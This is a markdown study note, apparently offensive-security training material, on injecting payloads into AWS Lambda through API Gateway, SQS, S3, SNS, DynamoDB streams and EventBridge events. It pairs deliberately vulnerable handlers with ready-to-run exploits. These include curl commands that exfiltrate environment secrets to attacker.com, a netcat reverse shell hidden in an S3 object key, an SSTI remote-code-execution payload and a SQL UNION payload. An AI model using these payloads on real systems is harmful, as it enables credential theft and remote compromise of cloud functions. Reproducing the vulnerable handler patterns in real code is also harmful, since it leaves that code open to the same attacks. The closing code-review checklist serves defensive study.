# 05.2 — Event Injection Attacks

## What This Note Covers

How serverless functions process events from cloud services and how attackers manipulate those events to inject malicious payloads. Covers SQS injection, SNS injection, S3 event trigger abuse, API Gateway payload manipulation, and DynamoDB stream abuse.

---

## What Is Event Injection?

A serverless function doesn't receive user input directly — it receives **events** from cloud services. An event is a JSON document describing what happened (an S3 object was uploaded, an SQS message arrived, an HTTP request came in).

Event injection exploits one core assumption: **the function trusts the content of the event**.

If an attacker can influence the event data — by writing to an S3 bucket the function monitors, publishing to an SQS queue the function reads, or sending an HTTP request to an API Gateway the function serves — they can inject malicious payloads into the function's execution context.

---

## Attack Vector 1: API Gateway — Direct HTTP Injection

Functions exposed via API Gateway receive HTTP request data. If the function passes request parameters to dangerous sinks (shell commands, SQL queries, template engines) without validation, classic injection applies.

```python
# Vulnerable Lambda function behind API Gateway
import subprocess
import json

def handler(event, context):
    # VULNERABLE: passes user input directly to shell
    filename = event['queryStringParameters']['file']
    result = subprocess.check_output(f"cat /tmp/{filename}", shell=True)
    return {
        'statusCode': 200,
        'body': result.decode()
    }
```

**Exploitation:**

```bash
# The function URL from API Gateway
FUNCTION_URL="https://abc123.execute-api.us-east-1.amazonaws.com/prod/readfile"

# OS command injection via query parameter
curl "$FUNCTION_URL?file=../proc/self/environ"
# Reads the Lambda environment variables

curl "$FUNCTION_URL?file=../proc/1/environ%3B+curl+http://attacker.com/\$(env|base64)"
# Exfiltrates environment (including secrets) to attacker server

# SSRF via injection — reach Lambda metadata service
curl "$FUNCTION_URL?file=/dev/stdin%3C/proc/self/net/fib_trie"
```

### Server-Side Template Injection (SSTI) in Lambda

```python
# Vulnerable — uses Jinja2 template with user input
from jinja2 import Template

def handler(event, context):
    name = event['queryStringParameters']['name']
    template = Template(f"Hello {name}!")  # VULNERABLE
    return {'statusCode': 200, 'body': template.render()}
```

```bash
# SSTI payload — execute code in Lambda's context
# URL-encode the payload
curl "$FUNCTION_URL?name={{7*7}}"
# Returns: Hello 49! → SSTI confirmed

curl "$FUNCTION_URL?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}"
# Returns: uid=993(sbx_user1051)... → RCE in Lambda context
# Now can access execution role credentials via os.environ
```

## Attack Vector 2: SQS Injection

Lambda functions often process SQS messages. If the function passes message body content to vulnerable sinks, an attacker who can publish to the queue controls the injection payload.

```python
# Vulnerable function — processes SQS messages containing commands
import subprocess
import json

def handler(event, context):
    for record in event['Records']:
        body = json.loads(record['body'])
        # VULNERABLE: uses message content in shell command
        result = subprocess.run(
            f"process_data --input {body['filename']}",
            shell=True, capture_output=True
        )
```

**Exploitation — publish a malicious SQS message:**

```bash
# If attacker has sqs:SendMessage on the queue:
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/processing-queue \
  --message-body '{"filename": "report.csv; curl http://attacker.com/$(env|base64 -w0)"}'

# The Lambda processes the message and executes the injected command
# The env dump (with secrets) is sent to attacker's server
```

### SQL Injection via SQS

```python
# Vulnerable — builds SQL from SQS message content without parameterisation
import pymysql
import json

def handler(event, context):
    conn = pymysql.connect(host=os.environ['DB_HOST'], ...)
    for record in event['Records']:
        body = json.loads(record['body'])
        user_id = body['user_id']
        # VULNERABLE SQL query
        cursor.execute(f"SELECT * FROM orders WHERE user_id = '{user_id}'")
```

```bash
# SQLi payload via SQS message
aws sqs send-message \
  --queue-url https://sqs.REGION.amazonaws.com/ACCOUNT/orders-queue \
  --message-body '{"user_id": "1'"'"' UNION SELECT username,password,null FROM admin_users-- -"}'
```

## Attack Vector 3: S3 Event Trigger Abuse

Lambda functions are frequently triggered by S3 events (`s3:ObjectCreated:*`). The function receives an event containing the bucket name and object key. If it processes the object without validation:

```python
# Vulnerable — executes shell command using S3 object key from event
import boto3
import subprocess

def handler(event, context):
    record = event['Records'][0]
    bucket = record['s3']['bucket']['name']
    key = record['s3']['object']['key']
    
    # VULNERABLE: uses S3 key in shell command
    subprocess.run(f"convert /tmp/{key} /tmp/output.png", shell=True)
```

**Exploitation — upload a maliciously named file to the trigger bucket:**

```bash
# If attacker can write to the S3 bucket (or it's public-write):
aws s3 cp /dev/null \
  "s3://target-bucket/; curl http://attacker.com/$(env|base64 -w0) #.png" \
  --no-sign-request  # if bucket allows unauthenticated uploads

# Or with credentials:
aws s3 cp /dev/null \
  's3://target-bucket/"; nc attacker.com 4444 -e /bin/sh; echo ".png'
```

### Path Traversal via S3 Key

```python
# Vulnerable — allows path traversal via S3 key
import boto3, os

def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    s3 = boto3.client('s3')
    # Downloads to /tmp/ using the key as filename — traversal possible
    local_path = f"/tmp/{key}"
    s3.download_file(bucket, key, local_path)
    # Then processes local_path...
```

```bash
# Upload object with traversal key
aws s3 cp malicious.py s3://target-bucket/../../../proc/self/fd/  # varies by runtime
```

## Attack Vector 4: SNS Injection

SNS (Simple Notification Service) publishes messages to multiple subscribers. If a Lambda subscribes to an SNS topic and processes message content unsafely:

```bash
# Publish a malicious message to an SNS topic
aws sns publish \
  --topic-arn arn:aws:sns:us-east-1:123456789012:notification-topic \
  --message '{"action": "process", "data": "$(curl http://attacker.com/$(env|base64))"}'

# If Lambda processes this message in a shell command → injection
```

## Attack Vector 5: DynamoDB Stream Injection

Lambda can trigger on DynamoDB Streams (changes to a DynamoDB table). If an attacker can write to the table, they control the stream event content.

```python
# Vulnerable — processes DynamoDB stream events
def handler(event, context):
    for record in event['Records']:
        if record['eventName'] == 'INSERT':
            # VULNERABLE: uses DynamoDB item content in command
            item = record['dynamodb']['NewImage']
            cmd = item['command']['S']
            os.system(cmd)  # RCE via DynamoDB item content
```

```bash
# Write a malicious item to the DynamoDB table
aws dynamodb put-item \
  --table-name target-table \
  --item '{"id": {"S": "attack"}, "command": {"S": "curl http://attacker.com/$(env|base64)"}}'

# The DynamoDB stream triggers Lambda with this item → RCE
```

## Attack Vector 6: EventBridge / CloudWatch Events

Functions triggered by scheduled events or EventBridge rules process the event object. If the event includes external data fed into EventBridge patterns, injection may be possible.

```bash
# Custom EventBridge event with injected payload
aws events put-events \
  --entries '[{
    "Source": "custom.app",
    "DetailType": "DataProcessing",
    "Detail": "{\"data\": \"; env | curl -d @- http://attacker.com/\"}",
    "EventBusName": "default"
  }]'
```

## Identifying Injection Points — Code Review Checklist

When you have access to function source code, look for:

```python
# HIGH RISK — these patterns with event-derived data = injection
subprocess.run(... shell=True)          # command injection
os.system(...)                           # command injection
eval(...)                                # code injection
exec(...)                                # code injection
cursor.execute(f"...{user_data}...")     # SQL injection
Template(f"...{user_data}...")           # SSTI
open(user_data, 'r')                    # path traversal
pickle.loads(user_data)                  # deserialisation RCE
yaml.load(user_data)                     # unsafe YAML deserialisation
```

## Quick Reference — Event Injection Commands

```bash
# API Gateway — test for injection
curl "FUNCTION_URL?param=test" -v
curl "FUNCTION_URL?param='+OR+1=1--"       # SQLi
curl "FUNCTION_URL?param={{7*7}}"           # SSTI
curl "FUNCTION_URL?param=../etc/passwd"     # path traversal

# SQS — send malicious message
aws sqs send-message \
  --queue-url QUEUE_URL \
  --message-body '{"field": "value; INJECTED_COMMAND"}'

# S3 — upload maliciously named file
aws s3 cp /dev/null "s3://BUCKET/; INJECTED_COMMAND #.txt"

# SNS — publish malicious notification
aws sns publish \
  --topic-arn TOPIC_ARN \
  --message '{"field": "$(INJECTED_COMMAND)"}'

# DynamoDB — write malicious item
aws dynamodb put-item \
  --table-name TABLE \
  --item '{"pk": {"S": "atk"}, "data": {"S": "INJECTED"}}'
```
